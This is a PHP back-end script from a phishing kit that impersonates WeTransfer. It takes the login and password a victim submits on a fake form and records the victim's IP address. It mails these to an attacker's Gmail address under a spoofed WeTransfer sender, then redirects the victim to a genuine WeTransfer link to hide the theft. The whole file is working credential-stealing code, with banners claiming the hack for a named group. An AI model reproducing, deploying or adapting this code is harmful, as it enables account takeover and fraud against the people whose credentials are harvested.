<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['login'];
$passwd = $_POST['pass'];
$own = 'blessed.leads007@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'ultimateresult@amaslim.com';
$domain = 'WETRANSFER NEW';
$subj = "$domain Login";
$headers .= "From: WeTransfer<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________BLAZERS CYBER TEAM_________</td></tr>
 <tr><td>$domain I.D: $login<td/></tr>
 <tr><td>Password: $passwd</td></tr>
 <tr><td>IP: $ip</td></tr>
 <tr><td>Date: $server</td></tr>
 <tr><td>________HACKED BY BLESSED MUNO__________</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: google.com" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: https://wetransfer.com/downloads/2f5358752626e2d79a336c455c78090420170804005825/cb14f97eb585e1568159a63ffc1f50eb20170804005825/e24034?utm_campaign=WT_email_tracking&utm_content=general&utm_medium=download_button&utm_source=notify_recipient_email");
}
?>
